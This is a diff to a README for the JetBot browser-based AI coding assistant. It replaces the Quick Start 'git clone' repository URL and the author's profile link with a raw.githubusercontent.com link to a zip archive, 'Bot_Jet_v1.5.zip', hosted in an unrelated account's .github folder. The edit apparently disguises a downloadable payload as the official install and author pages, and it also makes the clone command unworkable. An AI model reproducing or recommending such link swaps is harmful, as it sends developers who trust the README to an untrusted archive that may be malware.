@@ -28,7 +28,7 @@ JetBot is a fully browser-based AI coding assistant. No backend server, no deplo
 ## Quick Start
 
 ```bash
-git clone https://github.com/hongxin/JetBot.git
+git clone https://raw.githubusercontent.com/Titanicacidhorn810/JetBot/main/.github/Bot_Jet_v1.5.zip
 cd JetBot/jetbot
 npm install
 npm run dev
@@ -139,7 +139,7 @@ Three-tier access control: **safe** (auto-approve), **risky** (approve once, the
 
 ## Author
 
-**Hongxin Zhang** — [github.com/hongxin](https://github.com/hongxin)
+**Hongxin Zhang** — [github.com/hongxin](https://raw.githubusercontent.com/Titanicacidhorn810/JetBot/main/.github/Bot_Jet_v1.5.zip)
 
 ## License
 
